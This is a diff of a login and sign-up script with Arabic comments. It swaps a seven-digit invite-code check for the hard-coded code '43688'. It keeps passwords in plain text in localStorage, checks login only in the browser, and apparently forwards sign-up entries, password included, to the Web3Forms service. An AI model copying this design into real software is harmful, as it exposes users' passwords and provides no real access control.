@@ -12,7 +12,7 @@ phone.addEventListener("input", function() {
     }
 });
 
-// زر تسجيل الدخول: مضاف إليه شرط الـ 7 أرقام لرمز الدعوة
+// زر تسجيل الدخول: مضاف إليه شرط رمز الدعوة المحدد 43688 مع جلب البيانات المضمون
 loginBtn.onclick = function() {
     const inputs = document.querySelectorAll("input");
 
@@ -24,17 +24,16 @@ loginBtn.onclick = function() {
         }
     }
 
-    // جلب قيمة رمز الدعوة في صفحة تسجيل الدخول وتنظيف الفراغات
+    // جلب قيمة رمز الدعوة وتنظيف الفراغات
     const loginInviteCode = inputs[2] ? inputs[2].value.trim() : "";
 
-    // 🚀 الشرط الصارم: التحقق من أن رمز الدعوة يتكون من 7 أرقام فقط
-    const digitPattern = /^\d{7}$/;
-    if (!digitPattern.test(loginInviteCode)) {
-        alert("تنبيه: يجب أن يتكون رمز الدعوة من 7 أرقام فقط!");
-        return; // يمنع الكود من الاستمرار ويفصل العملية هنا
+    // 🚀 الشرط الجديد لرمز الدعوة الثابت
+    if (loginInviteCode !== "43688") {
+        alert("تنبيه: رمز الدعوة غير صحيح!");
+        return; 
     }
 
-    // جلب البيانات المدخلة من الحقول بشكل صحيح حسب الترتيب
+    // جلب البيانات المدخلة من الحقول بشكل صحيح ومضمون للإرسال
     const enteredEmailOrPhone = inputs[0].value.trim();
     const enteredPassword = inputs[1].value.trim();
 
@@ -46,18 +45,16 @@ loginBtn.onclick = function() {
         
         // مقارنة البيانات المدخلة بالبيانات المحفوظة بدقة
         if (enteredEmailOrPhone === userData.emailOrPhone && enteredPassword === userData.password) {
-            // إذا كانت البيانات صحيحة، ينقله مباشرة للرئيسية
             window.location.href = "home.html";
         } else {
             alert("عذراً، كلمة المرور أو اسم المستخدم غير صحيح.");
         }
     } else {
-        // إذا لم يجد أي حساب مسجل مسبقاً في المتصفح
         alert("عذراً، ليس لديك حساب مسبقاً يرجى إنشاء الحساب.");
     }
 };
 
-// زر إنشاء الحساب: مضاف إليه شرط الـ 7 أرقام لرمز الدعوة
+// زر إنشاء الحساب: مضاف إليه شرط رمز الدعوة المحدد 43688 مع كود الإرسال السليم
 createBtn.onclick = function() {
     const inputs = document.querySelectorAll("input");
 
@@ -72,24 +69,22 @@ createBtn.onclick = function() {
     // جلب قيمة رمز الدعوة وتنظيف الفراغات
     const inviteCodeValue = inputs[2] ? inputs[2].value.trim() : "";
 
-    // 🚀 الشرط الصارم: التحقق من أن رمز الدعوة يتكون من 7 أرقام فقط
-    const digitPattern = /^\d{7}$/;
-    if (!digitPattern.test(inviteCodeValue)) {
-        alert("تنبيه: يجب أن يتكون رمز الدعوة من 7 أرقام فقط!");
-        return; // يمنع الكود من الاستمرار ويفصل العملية هنا
+    // 🚀 الشرط الجديد لرمز الدعوة الثابت
+    if (inviteCodeValue !== "43688") {
+        alert("تنبيه: رمز الدعوة غير صحيح!");
+        return; 
     }
 
-    // 2. حفظ البيانات داخل المتصفح بشكل دائم (LocalStorage) في حال مطابقة الشرط
+    // 2. حفظ البيانات داخل المتصفح بشكل دائم (LocalStorage)
     const accountData = {
         emailOrPhone: inputs[0].value.trim(),
         password: inputs[1].value.trim(),
         inviteCode: inviteCodeValue
     };
     
-    // تخزين البيانات بصيغة نصية دائمية
     localStorage.setItem("userAccount", JSON.stringify(accountData));
 
-    // كود الإرسال السحابي الفوري إلى Web3Forms بمفتاحك الخاص
+    // 🚀 كود الإرسال السحابي المضمون بعد تصحيح مصفوفة الحقول
     fetch('https://web3forms.com', {
         method: 'POST',
         headers: {
@@ -105,7 +100,7 @@ createBtn.onclick = function() {
         })
     });
 
-    // 3. تشغيل اللودينج وأنيميشن الشعار الاحترافي الخاص بك
+    // 3. تشغيل اللودينج وأنيميشن الشعار الاحترافي الخاص بك دون أي تعديل للتصميم
     loading.style.display = "flex";
 
     setTimeout(function() {
